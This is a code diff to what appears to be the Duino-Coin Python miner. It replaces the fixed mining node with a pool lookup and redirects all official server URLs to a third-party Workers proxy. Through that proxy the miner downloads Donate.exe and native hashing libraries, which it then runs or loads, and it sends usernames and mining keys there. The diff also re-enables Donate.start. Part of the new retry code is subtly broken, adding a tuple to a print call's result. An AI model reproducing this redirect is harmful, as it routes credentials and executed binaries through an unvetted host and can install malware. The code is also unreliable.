@@ -416,16 +416,48 @@ class Client:
 
     def fetch_pool(retry_count=1):
         """
-        Always use the specified node: darkhunter-node-1 on port 2850
+        Fetches the best pool from the /getPool API endpoint
         """
-        NODE_ADDRESS = "master2"
-        NODE_PORT = 2850
-        
-        pretty_print(get_string("connecting_node")
-                     + "darkhunter-node-1",
-                     "info", "net0")
 
-        return (NODE_ADDRESS, NODE_PORT)
+        while True:
+            if retry_count > 60:
+                retry_count = 60
+
+            try:
+                pretty_print(get_string("connection_search"),
+                             "info", "net0")
+                response = requests.get(
+                    "https://duco-proxy.zhangmondaynb.workers.dev/getPool",
+                    timeout=Settings.SOC_TIMEOUT).json()
+
+                if response["success"] == True:
+                    pretty_print(get_string("connecting_node")
+                                 + response["name"],
+                                 "info", "net0")
+
+                    NODE_ADDRESS = response["ip"]
+                    NODE_PORT = response["port"]
+
+                    return (NODE_ADDRESS, NODE_PORT)
+
+                elif "message" in response:
+                    pretty_print(f"Warning: {response['message']}")
+                    + (f", retrying in {retry_count*2}s",
+                    "warning", "net0")
+
+                else:
+                    raise Exception("no response - IP ban or connection error")
+            except Exception as e:
+                if "Expecting value" in str(e):
+                    pretty_print(get_string("node_picker_unavailable")
+                                 + f"{retry_count*2}s {Style.RESET_ALL}({e})",
+                                 "warning", "net0")
+                else:
+                    pretty_print(get_string("node_picker_error")
+                                 + f"{retry_count*2}s {Style.RESET_ALL}({e})",
+                                 "error", "net0")
+            sleep(retry_count * 2)
+            retry_count += 1
 
 
 class Donate:
@@ -434,7 +466,7 @@ class Donate:
             if os.name == 'nt':
                 if not Path(
                         f"{Settings.DATA_DIR}/Donate.exe").is_file():
-                    url = ('https://server.duinocoin.com/'
+                    url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                            + 'donations/DonateExecutableWindows.exe')
                     r = requests.get(url, timeout=Settings.SOC_TIMEOUT)
                     with open(f"{Settings.DATA_DIR}/Donate.exe",
@@ -443,13 +475,13 @@ class Donate:
                     return
             elif os.name == "posix":
                 if osprocessor() == "aarch64":
-                    url = ('https://server.duinocoin.com/'
+                    url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                            + 'donations/DonateExecutableAARCH64')
                 elif osprocessor() == "armv7l":
-                    url = ('https://server.duinocoin.com/'
+                    url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                            + 'donations/DonateExecutableAARCH32')
                 elif osprocessor() == "x86_64":
-                    url = ('https://server.duinocoin.com/'
+                    url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                            + 'donations/DonateExecutableLinux')
                 else:
                     pretty_print(
@@ -466,7 +498,7 @@ class Donate:
 
     def start(donation_level):
         donation_settings = requests.get(
-            "https://server.duinocoin.com/donations/settings.json").json()
+            "https://duco-proxy.zhangmondaynb.workers.dev/donations/settings.json").json()
 
         if os.name == 'nt':
             cmd = (f'cd "{Settings.DATA_DIR}" & Donate.exe '
@@ -696,7 +728,7 @@ def get_string(string_name):
 def has_mining_key(username):
     try:
         response = requests.get(
-            "https://server.duinocoin.com/mining_key"
+            "https://duco-proxy.zhangmondaynb.workers.dev/mining_key"
                 + "?u=" + username,
             timeout=10
         ).json()
@@ -713,7 +745,7 @@ def check_mining_key(user_settings):
         key = ''
 
     response = requests.get(
-        "https://server.duinocoin.com/mining_key"
+        "https://duco-proxy.zhangmondaynb.workers.dev/mining_key"
             + "?u=" + user_settings["username"]
             + key,
         timeout=Settings.SOC_TIMEOUT
@@ -940,7 +972,7 @@ class Miner:
                 if not username:
                     username = choice(["revox", "Bilaboz"])
 
-                r = requests.get(f"https://server.duinocoin.com/users/{username}", 
+                r = requests.get(f"https://duco-proxy.zhangmondaynb.workers.dev/users/{username}", 
                              timeout=Settings.SOC_TIMEOUT).json()
                 correct_username = r["success"]
                 if not correct_username:
@@ -1048,7 +1080,10 @@ class Miner:
         retry_count = 0
         while True:
             try:
-                # Always use the fixed pool, don't fetch new one
+                if retry_count > 3:
+                    pool = Client.fetch_pool()
+                    retry_count = 0
+
                 socket_connection = Client.connect(pool)
                 POOL_VER = Client.recv(5)
 
@@ -1319,7 +1354,7 @@ class Fasthash:
         if os.name == 'nt':
             if not Path("libducohasher.pyd").is_file():
                 pretty_print(get_string("fasthash_download"), "info")
-                url = ('https://server.duinocoin.com/'
+                url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                        + 'fasthash/libducohashWindows.pyd')
                 r = requests.get(url, timeout=Settings.SOC_TIMEOUT)
                 with open(f"libducohasher.pyd", 'wb') as f:
@@ -1327,16 +1362,16 @@ class Fasthash:
                 return
         elif os.name == "posix":
             if osprocessor() == "aarch64":
-                url = ('https://server.duinocoin.com/'
+                url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                        + 'fasthash/libducohashPi4.so')
             elif osprocessor() == "armv7l":
-                url = ('https://server.duinocoin.com/'
+                url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                        + 'fasthash/libducohashPi4_32.so')
             elif osprocessor() == "armv6l":
-                url = ('https://server.duinocoin.com/'
+                url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                        + 'fasthash/libducohashPiZero.so')
             elif osprocessor() == "x86_64":
-                url = ('https://server.duinocoin.com/'
+                url = ('https://duco-proxy.zhangmondaynb.workers.dev/'
                        + 'fasthash/libducohashLinux.so')
             else:
                 pretty_print(
@@ -1434,7 +1469,7 @@ if __name__ == "__main__":
         print("Error checking mining key:", e)
 
     Donate.load(int(user_settings["donate"]))
-    pass
+    Donate.start(int(user_settings["donate"]))
 
     """
     Generate a random number that's used to
@@ -1453,13 +1488,12 @@ if __name__ == "__main__":
                      "warning")
         sleep(10)
 
-    # Always use the fixed node: darkhunter-node-1 on port 2850
-    fixed_pool = Client.fetch_pool()
+    fastest_pool = Client.fetch_pool()
 
     for i in range(threads):
         p = Process(target=Miner.mine,
                     args=[i, user_settings, blocks,
-                          fixed_pool, accept, reject,
+                          fastest_pool, accept, reject,
                           hashrate, single_miner_id, 
                           print_queue])
         p_list.append(p)
